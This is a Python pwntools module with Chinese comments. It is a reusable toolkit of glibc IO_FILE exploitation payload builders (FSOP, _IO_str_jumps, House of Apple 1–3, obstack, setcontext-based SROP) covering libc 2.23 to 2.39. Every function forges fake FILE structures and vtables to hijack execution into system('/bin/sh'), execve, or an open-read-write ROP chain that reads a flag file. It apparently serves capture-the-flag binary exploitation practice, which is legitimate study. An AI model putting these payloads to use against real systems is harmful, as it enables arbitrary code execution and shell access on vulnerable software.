'''
    IO_FILE攻击
'''
from pwn import *
from base_data import *

def FSOP(payload_addr, fun, param_value = BINSH, chain = 0):
    '''
        FSOP攻击工具
        libc2.23
        
        参数:
            payload_addr: payload将要写入的地址
            fun: 要调用的函数的地址
            param_value: 要调用函数的参数为payload_addr, param_value为函数的参数指针所指向的地址的值
            chain: 下一个链的地址(可选)
    '''
    print(hex(payload_addr))
    print(hex(fun))
    payload =  flat({
        0x00: param_value,          # fake_IO_FILE->flags = /bin/sh
        0x20: 0,                    # fake_IO_FILE->_IO_write_base = 0
        0x28: 1,                    # fake_IO_FILE->_IO_write_ptr = 1
        0x68: chain,                # fake_IO_FILE->chain = chain
        0xC0: 0,                    # fake_IO_FILE->_mode = 0
        0xD8: payload_addr,         # fake_IO_FILE->vtable = fake_vtable
        
        0x18: fun                   # fake_vtable->__overflow = fun
    }, filler = b'\x00')
    return payload
    

# 使用overflow触发
def IOoverflow(_IO_str_jumps, fun_addr, payload_addr = None, param = None):
    '''
        _IO_str_jumps攻击工具
        libc2.23~libc2.27(早期版本)
        
        参数:
            _IO_str_jumps: _IO_str_jumps实际地址
            fun_addr: 函数地址
            payload_addr: 内置/bin/sh地址, 只有在param为None时有效
            param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
    '''
    if (param is None and payload_addr is None):
        raise ValueError("必须设置 param 或 payload_addr 参数")

    if param is None:
        # 设置参数
        param = payload_addr + 0x30
        pass
    
    payload = flat({
        0x00: 0,                            # fake_IO_FILE->_flags = 0
        0x20: 0,                            # fake_IO_FILE->_IO_write_base = 0
        0x28: int((param - 100) / 2 + 1),   # fake_IO_FILE->_IO_write_ptr = (binsh地址 - 100) / 2 + 1
        0x30: BINSH,                        # 内置/bin/sh
        0x38: 0,                            # fake_IO_FILE->_IO_buf_base = 0
        0x40: int((param - 100) / 2),       # fake_IO_FILE->_IO_buf_end = (binsh地址 - 100) / 2
        0xC0: 0,                            # fake_IO_FILE->_mode = 0
        0xD8: _IO_str_jumps,           # fake_IO_FILE->vtable = &_IO_str_jumps
        0xE0: fun_addr,                     # fake_IO_FILE + 0xE0 = &system
    }, filler = b'\x00')
    return payload

# 使用IOfinish触发
def IOfinish(_IO_str_jumps, fun_addr, payload_addr = None, param = None):
    '''
        _IO_str_jumps攻击工具
        libc2.23~libc2.27(早期版本)
        
        参数:
            _IO_str_jumps: _IO_str_jumps实际地址
            fun_addr: 函数地址
            param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
            payload_addr: 内置/bin/sh地址, 只有在param为None时有效
    '''
    if (param is None and payload_addr is None):
        raise ValueError("必须设置 param 或 payload_addr 参数")

    if param is None:
        # 设置参数
        param = payload_addr + 0x30
        pass
    
    payload = flat({
        0x00: 0,                            # fake_IO_FILE->_flags = 0
        0x20: 0,                            # fake_IO_FILE->_IO_write_base = 0
        0x28: 1,                            # fake_IO_FILE->_IO_write_ptr = 1
        0x30: BINSH,                        # 内置/bin/sh
        0x38: param,                        # fake_IO_FILE->_IO_buf_base = /bin/sh地址
        0xC0: 0,                            # fake_IO_FILE->_mode = 0
        0xD8: _IO_str_jumps - 0x8,     # fake_IO_FILE + 0xD8 = &(_IO_str_jumps-0x8)
        0xE8: fun_addr,                     # fake_IO_FILE + 0xE8 = system
    }, filler = b'\x00')
    
    return payload

def HOQSPP(_IO_obstack_jumps, payload_addr,  fun_addr, param = None):
    '''
        House of 琴瑟琵琶 : 攻击_IO_obstack_jumps_addr
        libc2.27~libc2.35
        
    参数:
        _IO_obstack_jumps: _IO_obstack_jumps的实际地址
        payload_addr: payload将要写入的地址
        fun_addr: 要调用的函数的实际地址
        param: 函数的参数, 默认为内置的/bin/sh地址
    
    示例:
        payload = HOQSPP(_IO_obstack_jumps, payload_addr, system)
    '''
    if param is None:
        param = payload_addr + 0x40
    
    payload = flat({
        0x18:0x0,                           # fake_obstack->next_free = 0
        0x20:0x0,                           # fake_obstack->chunk_limit = 0, fake_IO_FILE_plus->_IO_write_base = 0
        0x28:0x1,                           # fake_IO_FILE_plus->_IO_write_ptr = 1
        0x30:0x0,                           # fake_IO_FILE_plus->_IO_write_end = 0
        0x38:fun_addr,                      # fake_obstack->chunkfun = system
        0x48:param,                         # fake_obstack->extra_arg = /bin/sh地址
        0x50:0xFFFFFFFFFFFFFFFF,            # fake_obstack->use_extra_arg = 1
        0xC0:0x0,                           # fake_IO_FILE_plus->_mode = 0
        0xD8:_IO_obstack_jumps + 0x8 * 4,   # fake_IO_FILE_plus->vtable = _IO_obstack_jumps + 0x8 * 4
        0xE0:payload_addr,                  # fake_IO_obstack_file->obstack = fake_IO_obstack, 我们重复利用空间
        0x40:BINSH,                         # 内置/bin/sh字符串值
    }, filler = b'\x00')
    
    return payload


def HOA1(wstrn_jumps, target, value, chain = 0):
    '''
        House of Apple1 : 攻击wstrn_jumps
        libc2.23~libc2.35
        
        修改target指向的地址的值为value, 这个地址是fake_IO_FILE+0xF0
        示例:
            payload = HOA1(wstrn_jumps, target, value)
            target -> payload_addr + 0xF0 -> value
        
        参数:
            wstrn_jumps: _IO_wstrn_jumps实际地址
            target: 要修改的地址
            value: 要写入的值
            chain: 下一个链的地址, 默认为0
        
        备注:
            `_IO_wstrn_jumps`在IDA中找, 其中`_IO_wstr_underflow`调用的`_IO_wdefault_uflow`函数
            直接搜索`_IO_wdefault_uflow`找引用
    '''
    
    payload = flat({
        0xC0:0,             # fp->_mode = 0
        0x20:0,             # fp->_IO_write_base = 0
        0x28:1,             # fp->_IO_write_ptr = 1
        0x68:chain,         # chain
        0x74:0x8,           # fp->_flags2 = 8
        0xA0:target,        # fp->_wide_data = target
        0xD8:wstrn_jumps,   # fp->vtable = _IO_wstrn_jumps
        0xF0:value,         # (_IO_wstrnfile*)fp->overflow_buf = 写入的地址的值
    }, filler = b'\x00')
    
    return payload

def HOA2overflow(_IO_wfile_jumps, payload_addr, fun, param = b' \x80;$0\x00', _libc27 = 0xE0):
    '''
        House of apple 2的overflow攻击链
        libc-2.31~libc-2.39
        
        参数:
            _IO_wfile_jumps: _IO_wfile_jumps实际地址
            payload_addr: payload将要写入的地址
            fun: 要调用的函数的地址
            param: 函数传入的指针的值
            _libc27: libc2.27及其以下的偏移地址为0x130，以上为0xE0
            
        param参数说明:
            该参数会复写fake_IO_FILE_plus的前面部分，所有有如下要求:
            
            字符串长度不得大于0x18，最大不得大于0x20
            
            libc2.39之前参数可用字符
                第一个字符可用: {[ ] [!] [$] [%] [0] [1] [4] [5] [@] [A] [D] [E] [P] [Q] [T] [U] [`] [a] [d] [e] [p] [q] [t] [u] }
                第二个字符可用: {[ ] [!] ["] [#] [$] [%] [&] ['] [0] [1] [2] [3] [4] [5] [6] [7] [@] [A] [B] [C] [D] [E] [F] [G] [P] [Q] [R] [S] [T] [U] [V] [W] [`] [a] [b] [c] [d] [e] [f] [g] [p] [q] [r] [s] [t] [u] [v] [w] }
            libc2.39之后，第二个参数必须固定为\x80
    '''
    if(len(param) > 0x20):
        raise Exception('参数长度不得大于0x20')
    
    payload = flat({
        0x0:0x8000,                                 # fp->_flags = 0 || fp->_flags = value ^ (0x0008 | 0x0800 | 0x0002)
        
        0x0:param,

        0x20:0,                                     # fp->_IO_write_base = 0
        0x28:1,                                     # fp->_IO_write_ptr = 1
        0x38:1,                                     # fp->_IO_buf_base = 1
        0xA0:payload_addr,                          # fp->_wide_data = fake_wide_data
        0xC0:0,                                     # fp->_mode = 0
        0xD8:_IO_wfile_jumps,                       # fp->vtable = _IO_wfile_jumps
        0 + 0x18:0,                                 # fake_wide_data->_IO_write_base = 0
        0 + 0x30:0,                                 # fake_wide_data->_IO_buf_base = 0
        0 + _libc27:payload_addr + 0x40 - 13 * 8,   # fake_wide_data->_wide_vtable = backdoor - 13*0x8
        0x40:fun,                                   # backdoor
    }, filler = b'\x00')
        
    return payload

# 针对libc2.27及其以下libc的HOA2overflow攻击链，详情见HOA2overflow
HOA2overflow_libc2_27 = lambda _IO_wfile_jumps, payload_addr, fun, param = b' \x80;$0\x00': HOA2overflow(_IO_wfile_jumps, payload_addr, fun, param, _libc27 = 0x130)

def HOA2underflow(_IO_wfile_jumps, payload_addr, fun, param = b' \x80;$0\x00', _libc27 = 0xE0):
    '''
        House of apple 2的underflow攻击链
        libc-2.31~libc-2.39
        
        参数:
            _IO_wfile_jumps: _IO_wfile_jumps实际地址
            payload_addr: payload将要写入的地址
            fun: 要调用的函数的地址
            param: 函数传入的指针的值
            _libc27: libc2.27及其以下的偏移地址为0x130，以上为0xE0
            
        param参数说明:
            该参数会复写fake_IO_FILE_plus的前面部分，所有有如下要求:
            
            字符串长度不得大于0x10
            
            libc2.39之前参数可用字符
                第一个字符可用: {[ ] [!] [$] [%] [0] [1] [4] [5] [@] [A] [D] [E] [P] [Q] [T] [U] [`] [a] [d] [e] [p] [q] [t] [u] }
                第二个字符可用: {[ ] [!] ["] [#] [$] [%] [&] ['] [0] [1] [2] [3] [4] [5] [6] [7] [@] [A] [B] [C] [D] [E] [F] [G] [P] [Q] [R] [S] [T] [U] [V] [W] [`] [a] [b] [c] [d] [e] [f] [g] [p] [q] [r] [s] [t] [u] [v] [w] }
            libc2.39之后，第二个参数必须固定为\x80
    '''
    if(len(param) > 0x10):
        raise Exception('参数长度不得大于0x10, 建议使用HOA2overflow')
    
    payload = flat({
        0x0:0x8000,                                 # fp->_flags = 0 或者 fp->_flags = value ^ (0x10 | 0x04 | 0x02)
        0x8:1,                                      # fp->_IO_read_ptr = 1
        
        0x0:param,
        
        0x10:0,                                     # fp->_IO_read_end = 0
        0x20:0,                                     # fp->_IO_write_base = 0
        0x28:1,                                     # fp->_IO_write_ptr = 1
        0x38:1,                                     # fp->_IO_buf_base = 1
        0xA0:payload_addr + 0x18,                   # fp->_wide_data = fake_wide_data
        0xC0:0,                                     # fp->_mode = 0
        0xD8:_IO_wfile_jumps + 8,                   # fp->vtable = _IO_wfile_jumps + 8
        
        0x18 + 0x0:1,                               # fake_wide_data->_IO_read_ptr = 1
        0x18 + 0x8:0,                               # fake_wide_data->_IO_read_end = 0
        0x18 + 0x30:0,                              # fake_wide_data->_IO_buf_base = 0
        0x18 + 0x40:0,                              # fake_wide_data->_IO_save_base = 0
        0x18 + _libc27:payload_addr + 0x40 - 13 * 8,# fake_wide_data->_wide_vtable = backdoor - 13 * 0x8
        0x40:fun,                                   # backdoor
    }, filler = b'\x00')
    
    payload = param + payload[len(param):]
    return payload

# 针对libc2.27及其以下libc的HOA2underflow攻击链，详情见HOA2underflow
HOA2underflow_libc2_27 = lambda _IO_wfile_jumps, payload_addr, fun, param = b' \x80;$0\x00': HOA2underflow(_IO_wfile_jumps, payload_addr, fun, param, _libc27 = 0x130)

def HOA3underflow(_IO_wfile_jumps, payload_addr, fun, param1_value_offset_8 = b'', param2_value = b'', param3_value = b'', param4 = 0xFFFFFFFFFFFFFFFF):
    '''
        HOA3的underflow攻击链
        libc2.31~libc2.39
        
        _IO_wfile_jumps: _IO_wfile_jumps地址
        payload_addr: payload将要写入的地址
        fun: 要调用的函数的地址
        param1_value_offset_8: 第一个参数指向的地址+8的值
        param2_value: 第二个参数指向的地址的值
        param3_value: 第三个参数指向的地址的值
        param4: 第四个参数
        
        注意 : 第四个参数的值要大于第三个参数的前三个字节的值
               第二个参数地址+0x20指向的值不可控
    '''
    fake_IO_wide_data = payload_addr + 0x30
    fake_codecvt = payload_addr + 0xA8
    fake_step = payload_addr + 0xC0
    
    payload = flat({
        # fake_IO_FILE
        0x0:0x8000,                         # fp->_flags = 0x8000
        0x8:param3_value,                   # fp->_IO_read_ptr = param3_value
        0x10:param4,                        # fp->_IO_read_end > fp->_IO_read_ptr (param4)
        0x20:0,                             # fp->_IO_write_base = 0
        0x28:1,                             # fp->_IO_write_ptr = 1
        0x98:fake_codecvt,                  # fp->_codecvt = fake_codecvt
        0xA0:fake_IO_wide_data,             # fp->_wide_data = fake_IO_wide_data
        0xC0:0,                             # fp->_mode = 0
        0xD8:_IO_wfile_jumps + 0x8,         # fp->vtable = _IO_wfile_jumps + 0x8
        
        # fake_IO_wide_data
        0x30 + 0x0:0,                      # fake_IO_wide_data->_IO_read_ptr (>=fake_IO_wide_data->_IO_read_end)(被赋值)
        0x30 + 0x8:0,                      # fake_IO_wide_data->_IO_read_end = 0
        0x30 + 0x10:0,                     # fake_IO_wide_data->_IO_read_base 被赋值
        0x30 + 0x30:param2_value,          # fake_IO_wide_data->_IO_buf_base (param2_value)
        0x30 + 0x60:0,                     # fake_IO_wide_data->_IO_last_state 被赋值
        
        # fake_codecvt
        0xA8 + 0x0:fake_step,              # fake_codecvt->__cd_in.step = fake_step
        0xA8 + 0x8:0,                      # fake_codecvt->__cd_in.step_data.__outbuf
        0xA8 + 0x10:0,                     # fake_codecvt->__cd_in.step_data.__outbufend
        0xA8 + 0x28:0,                     # fake_codecvt->__cd_in.step_data.__statep
        
        # fake_step
        0xC0 + 0x0:0,                      # fake_step->__shlib_handle == NULL
        0xC0 + 0x8:param1_value_offset_8,  # fake_step->__shlib_handle + 8 = param1_value_offset_8
        0xC0 + 0x28:fun,                   # fake_step.__fct = fun
    }, filler = b'\x00')
    return payload


def HOYJDQ(read_addr, ret_gadget, reg = {}):
    '''
        House of 一骑当千 : 高版本libc(libc-2.31及其之后)通过setcontext触发srop
        
        参数:
            read_addr: 一个可写的地址即可
            ret_gadget: ret gadget
            reg: 需要设置的寄存器, 默认不设置
                 可选寄存器有: 
                    rbx, rcx, rdx, rdi, rsi 
                    r8, r9, r12, r13, r14, r15,
                    rbp, rsp 
            
            
                 
        使用方法:
            直接触发setcontext, rdi指向payload地址即可
        
        示例:
            HOYJDQ(payload_addr, ret_gadget, {'rsp':123, 'rdi' : 123, 'rsi':456, 'rsi':789})
    '''
    # 默认寄存器值
    registers = {
        'rbx': 0, 'rcx': 0, 'rdx': 0, 'rdi': 0, 'rsi': 0,
        'r8': 0, 'r9': 0, 'r12': 0, 'r13': 0, 'r14': 0, 'r15': 0,
        'rbp': 0, 'rsp': 0
    }
    
    # 更新用户指定的寄存器值
    registers.update(reg)
    
    payload = flat({
        0xE0: read_addr,    # 这里写入一个可读的地址
        0x1C0: 0x0,         # 这里写入0
        # 设置rcx
        0xA8: ret_gadget,   # ret gadget
        # SROP
        0xA0: registers['rsp'],
        0x80: registers['rbx'],
        0x78: registers['rbp'],
        0x48: registers['r12'],
        0x50: registers['r13'],
        0x58: registers['r14'],
        0x60: registers['r15'],
        
        0x70: registers['rsi'],
        0x68: registers['rdi'],
        0x98: registers['rcx'],
        0x28: registers['r8'],
        0x30: registers['r9'],
        0x88: registers['rdx'],
        }, filler = b'\x00')
    return payload


def HOA3underflow_srop(_IO_wfile_jumps, setcontext_addr, ret_gadget, payload_addr, rop_addr, reg = {}):
    '''
        HOA3的underflow攻击链就行srop攻击(需自己编写rop并提供rop地址)
        libc-2.31 ~ libc-2.39
        返回值长度为:0x288
        
        参数:
            _IO_wfile_jumps: _IO_wfile_jumps实际地址
            setcontext_addr: setcontext函数的地址
            ret_gadget: ret gadget的地址
            payload_addr: payload将要写入的地址
            rop_addr: ROP链的地址
            reg: 详情见HOYJDQ函数的reg参数
    '''
    # 默认寄存器值副本
    registers = reg.copy()
    registers['rsp'] = rop_addr
    
    payload1 = HOA3underflow(_IO_wfile_jumps, payload_addr, setcontext_addr)
    payload2 = HOYJDQ(payload_addr, ret_gadget, registers)
    payload = payload1 + payload2[0x30:]
    return payload

def HOA3underflow_rop(_IO_wfile_jumps, setcontext_addr, ret_gadget, payload_addr, rop_chain, reg = {}):
    '''
        HOA3的underflow攻击链就行rop攻击(需自己编写rop无需提供rop地址)
        libc-2.31 ~ libc-2.39
        
        参数:
            _IO_wfile_jumps: _IO_wfile_jumps实际地址
            setcontext_addr: setcontext函数的地址
            ret_gadget: ret gadget的地址
            payload_addr: payload将要写入的地址
            rop_chain: ROP链的内容
            reg: 详情见HOYJDQ函数的reg参数
    '''
    payload = HOA3underflow_srop(_IO_wfile_jumps, setcontext_addr, ret_gadget, payload_addr, payload_addr + 0x288, reg)
    if len(payload) != 0x288:
        log.warning(f'payload长度不为0x288, 实际长度: {len(payload)}')
        payload = HOA3underflow_srop(_IO_wfile_jumps, setcontext_addr, ret_gadget, payload_addr, payload_addr + len(payload), reg)
        
    return payload + rop_chain

def HOA3underflow_execve(libc, payload_addr):
    '''
        HOA3的underflow攻击链执行execve("/bin/sh", 0, 0)
        libc-2.31 ~ libc-2.39
        
        参数:
            libc: libc对象(必须设置base地址)
            payload_addr: payload将要写入的地址
    '''
    rop = ROP(libc)
    rop.execve(next(libc.search('/bin/sh')), 0)
    return HOA3underflow_rop(libc.sym['_IO_wfile_jumps'], libc.sym['setcontext'], rop.find_gadget(['ret'])[0], payload_addr, rop.chain(),
                             {'rdx':0})


def HOA3underflow_orw(libc, payload_addr, flag = b'flag'):
    '''
        HOA3的underflow攻击链执行orw
        libc-2.31 ~ libc-2.39
        
        参数:
            libc: libc对象(必须设置base地址)
            payload_addr: payload将要写入的地址
    '''
    rop = ROP(libc,  base=payload_addr + 0x288)
    
    # 因为缺少gadget，所以需要自己编写rop
    # rop.open(flag, 0)
    # rop.read(3, payload_addr, 0x100)
    # rop.write(1, payload_addr, 0x100)
    
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    ret = syscall + 2 # len(asm('syscall'))
    # open
    rop.rax = constants.SYS_open
    rop.call(syscall, [flag, 0])
    # read
    rop.rax = constants.SYS_read
    rop.call(syscall, [3, payload_addr])
    # write
    rop.rax = constants.SYS_write
    rop.call(syscall, [1, payload_addr])
    
    return HOA3underflow_rop(libc.sym['_IO_wfile_jumps'], libc.sym['setcontext'], ret, payload_addr, rop.chain(),
                             {'rdx':0x100})

